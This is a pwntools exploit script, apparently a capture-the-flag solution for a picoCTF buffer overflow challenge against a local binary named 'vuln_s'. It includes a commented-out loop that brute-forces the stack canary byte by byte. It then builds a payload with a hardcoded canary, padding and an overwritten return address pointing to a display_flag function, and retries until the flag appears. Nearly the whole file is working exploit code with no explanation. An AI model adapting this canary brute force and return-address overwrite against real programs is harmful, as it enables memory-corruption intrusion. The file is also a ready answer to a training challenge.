from pwn import *
context(terminal=['tmux','new-window'],os='linux',arch='i386',log_level='error')

payload = b'a'*32
canary = b''
# for i in range(4):
#     for n in range(0x100):
#         p = process('./vuln_s')
#         p.sendline(str(32+i+1))
#         test = chr(n).encode()
#         p.send(payload+canary+test)
#         if b'Flag' in p.recvall():
#             canary += test
#             break

canary = b'flag'
base = 0x56555000
display_flag = base + 0x7ed
dummy = p32(0xbbbbbbbb)

payload += canary
payload += dummy*4
payload += p32(display_flag)


for i in range(0x1000):
    p = process('./vuln_s')
    p.sendline(str(56))
    p.send(payload)
    result = p.recvall()
    if b'pico' in result:
        print(result)
        exit()
